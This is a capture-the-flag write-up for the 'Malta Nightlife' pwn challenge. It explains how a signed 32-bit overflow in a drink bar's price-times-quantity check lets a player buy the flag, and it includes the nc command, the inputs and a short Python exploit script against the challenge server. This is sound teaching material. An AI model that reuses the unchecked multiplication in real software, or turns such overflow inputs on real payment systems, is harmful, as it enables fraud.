# Malta Nightlife – Writeup

**Category:** PWN  
**Challenge name:** Malta Nightlife  
**Difficulty:** Easy  
**Service:**  
```
nc malta.ctf.pascalctf.it 9001
```

---

## Description

The challenge simulates a drink bar system where users can purchase drinks using a virtual balance.  
We start with a balance of **100** and can choose from 10 different drinks.  

One special drink called **"Secret challenge"** costs **1,000,000,000** and prints the secret recipe, which is the flag.

Goal: retrieve the flag.

---

## Analysis

The program performs the following operations:

1. Asks the user to select a drink.
2. Asks for the quantity.
3. Computes the total cost as:
   ```c
   total_cost = price * quantity;
   ```
4. Checks if the balance is sufficient:
   ```c
   if (balance >= total_cost) {
       balance -= total_cost;
       printf("Secret recipe: %s", getenv("FLAG"));
   }
   ```

The vulnerability lies in the multiplication of `price * quantity`, which is done using a **32-bit signed integer**.  
If this multiplication overflows, the resulting value becomes negative.

Since the program compares `balance >= total_cost` using signed integers, a negative `total_cost` will always satisfy the condition, allowing us to buy an item even if we do not have enough money.

---

## Exploitation

The expensive drink costs:
```
1,000,000,000
```

If we choose a quantity of:
```
3
```

The multiplication becomes:
```
1,000,000,000 * 3 = 3,000,000,000
```

This exceeds the maximum value of a 32-bit signed integer (2,147,483,647) and overflows into a **negative number**.

As a result:
- The balance check passes
- The program subtracts a negative number (effectively adding money)
- The flag is printed

---

## Exploit Steps

Connect to the service:
```bash
nc malta.ctf.pascalctf.it 9001
```

Then input:
```
10
3
```

Where:
- `10` = Secret challenge drink
- `3` = quantity that triggers integer overflow

---

## Proof of Concept (Python)

```python
import socket

HOST = "malta.ctf.pascalctf.it"
PORT = 9001

s = socket.create_connection((HOST, PORT))

s.recv(4096)
s.sendall(b"10\n")
s.recv(4096)
s.sendall(b"3\n")

print(s.recv(4096).decode())
s.close()
```

---

## Conclusion

This challenge demonstrates a classic **integer overflow vulnerability** in price calculation logic.  
By exploiting signed integer overflow, we bypass the balance check and force the program to reveal the flag.

---

